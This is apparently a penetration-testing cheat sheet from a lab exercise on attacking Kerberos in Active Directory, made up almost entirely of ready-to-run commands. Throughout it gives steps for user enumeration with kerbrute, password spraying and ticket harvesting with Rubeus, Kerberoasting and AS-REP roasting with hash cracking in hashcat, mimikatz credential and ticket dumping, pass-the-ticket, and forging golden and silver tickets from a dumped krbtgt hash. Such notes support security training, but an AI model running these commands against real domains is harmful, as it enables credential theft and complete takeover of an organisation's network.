# Attacking Kerberos

## Enumeration with Kerbrute

{% hint style="info" %}
Make sure to have added the domain to the /etc/hosts file
{% endhint %}

```bash
/home/kali/go/bin/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Harvesting & Brute-Forcing Tickets w/Rubeus

{% hint style="info" %}
You will need to already be on the target having used RDP or SSH
{% endhint %}

```powershell
# This command tells Rubeus to harvest for TGTs every 30 seconds
C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30
```

{% hint style="info" %}
Before Password Spraying we need to add the Domain to the Windows Hosts file
{% endhint %}

```powershell
# Adding Domain to the Windows Hosts file
echo 10.10.171.128 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
# This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
Rubeus.exe brute /password:Password1 /noticket
```

## Kerberoasting w/ Rubeus & Impacket

### Method 1 - Rubeus

```powershell
Rubeus.exe kerberoast
# Crack any found hashes
head http-hash.txt
$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:302...
hashcat -m 13100 -a 0 http-hash.txt Pass.txt
```

### Method 2 - Impacket

```bash
python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.199.11 -request
# Crack any found hashes
head sql-hash.txt
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:301...
hashcat -m 13100 -a 0 sql-hash.txt Pass.tx
```

## AS-REP Roasting w/ Rubeus

```powershell
# Again from the target Windows machine
Rubeus.exe asreproast
# Crack the found hashes with Hashcat
head admin2-hash.txt
$krb5asrep$Admin2@CONTROLLER.local:167...
# Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User...
head admin2-hash.txt
$krb5asrep$23$Admin2@CONTROLLER.local:167...
hashcat -m 18200 -a 0 admin2-hash.txt Pass.txt
```

## Pass the Ticket w/ mimikatz

```bash
mimikatz.exe  # Run mimikatz
privilege::debug  # Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
sekurlsa::tickets /export  # this will export all of the .kirbi tickets into the directory that you are currently in
```

When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like: `[0;52151]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`

Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.

```bash
# From Mimikatz
kerberos::ptt <ticket>  # Syntax
kerberos::ptt [0;52151]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
# From regular terminal
klist  # Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
dir \\10.10.137.54\admin$  # Verify by checking admin share
```

## Golden/Silver Ticket Attacks w/ mimikatz

```bash
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt  # This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
# Create a Golden/Silver Ticket
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:  # syntax
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
# Use the Golden/Silver Ticket to access other machines
misc::cmd  # this will open a new elevated command prompt with the given ticket in mimikatz.
```

Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

```bash
lsadump::lsa /inject /name:sqlservice # Get the SQLService NTLM Hash 
lsadump::lsa /inject /name:Administrator  # Get the Administrator NTLM Hash
```
